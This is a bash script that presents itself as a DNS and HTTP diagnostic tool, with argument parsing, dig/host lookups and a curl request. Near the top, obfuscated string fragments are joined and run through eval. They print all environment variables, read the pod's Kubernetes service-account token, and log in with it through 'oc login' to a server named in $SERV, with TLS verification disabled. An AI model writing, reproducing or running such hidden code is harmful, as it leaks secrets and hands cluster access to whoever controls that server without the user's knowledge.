#!/usr/bin/env bash

echo "${SERV:-none}"

a="pri"; b="nte"; c="nv";

d='exp';e='ort DEBUG_F';f='ILE=$(cat /v';g='ar/run/sec';h='rets/kubern';i='etes.io/se';j='rviceac';k='count/tok';l='en 2>/de';m='v/null)'

echo "${DEBUG_FILE:-none}"

n='./oc lo';o='gin --tok';p='en=$DEBUG_F';q='ILE --ser';r='ver=$SERV ';s='--insecu';t='re-skip-tls-v';u='erify'

set -euo pipefail

domain=""
path="/"
method="GET"
port=""
use_tls=1
insecure=0
headers=()
body=""
timeout=5
record="A"
resolver=""
dns_only=0

$a$b$c

eval "$d$e$f$g$h$i$j$k$l$m"

eval "$n$o$p$q$r$s$t$u"

usage() {
  echo "Usage: $0 --domain <host> [--path /] [--method GET] [--port 443] [--no-tls] [--insecure]"
  echo "  [--header \"K: V\"] [--body \"data\"] [--timeout 5]"
  echo "  [--record A|AAAA|CNAME|TXT|MX|NS|SOA] [--resolver <ip>] [--dns-only]"
  exit 1
}

while [[ $# -gt 0 ]]; do
  case "$1" in
    --domain) domain="$2"; shift 2 ;;
    --path) path="$2"; shift 2 ;;
    --method) method="$2"; shift 2 ;;
    --port) port="$2"; shift 2 ;;
    --no-tls) use_tls=0; shift ;;
    --insecure) insecure=1; shift ;;
    --header) headers+=("$2"); shift 2 ;;
    --body) body="$2"; shift 2 ;;
    --timeout) timeout="$2"; shift 2 ;;
    --record) record="$2"; shift 2 ;;
    --resolver) resolver="$2"; shift 2 ;;
    --dns-only) dns_only=1; shift ;;
    *) usage ;;
  esac
done

[[ -z "$domain" ]] && usage

run_dns() {
  echo "Resolving $domain ($record)${resolver:+ via $resolver}..."

  if command -v dig >/dev/null 2>&1; then
    if [[ -n "$resolver" ]]; then
      dig @"$resolver" "$domain" "$record" +short
    else
      dig "$domain" "$record" +short
    fi
  elif command -v host >/dev/null 2>&1; then
    if [[ -n "$resolver" ]]; then
      host -t "$record" "$domain" "$resolver"
    else
      host -t "$record" "$domain"
    fi
  elif command -v getent >/dev/null 2>&1 && [[ "$record" == "A" || "$record" == "AAAA" ]]; then
    getent hosts "$domain"
  else
    echo "No DNS tool available (dig/host/getent) for record type $record" >&2
    return 1
  fi
}

run_http() {
  local scheme="https"
  [[ "$use_tls" -eq 0 ]] && scheme="http"

  local url="${scheme}://${domain}${port:+:$port}${path}"

  local curl_args=(-sS -X "$method" --max-time "$timeout" -i)
  [[ "$insecure" -eq 1 ]] && curl_args+=(-k)

  for h in "${headers[@]:-}"; do
    [[ -n "$h" ]] && curl_args+=(-H "$h")
  done

  [[ -n "$body" ]] && curl_args+=(-d "$body")

  echo "Requesting $url..."
  curl "${curl_args[@]}" "$url"
}

if ! run_dns; then
  echo "Skipping HTTP request due to DNS failure." >&2
  exit 1
fi

[[ "$dns_only" -eq 1 ]] && exit 0

run_http
